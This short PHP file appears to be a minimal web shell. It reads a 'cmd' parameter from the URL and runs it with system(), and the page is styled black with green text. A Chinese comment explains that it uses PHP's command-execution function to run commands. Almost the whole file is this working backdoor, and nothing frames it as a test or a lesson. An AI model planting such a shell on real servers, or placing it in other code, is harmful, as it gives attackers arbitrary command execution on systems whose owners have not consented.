<?php
$arg = $_GET['cmd'];
if($arg){
    system($arg);
}
?>
<body style='background-color: black;color: #0dff00;'></body>
//chinese word ↓
//程序利用PHP中的执行命令漏洞来进行php脚本执行，system()。
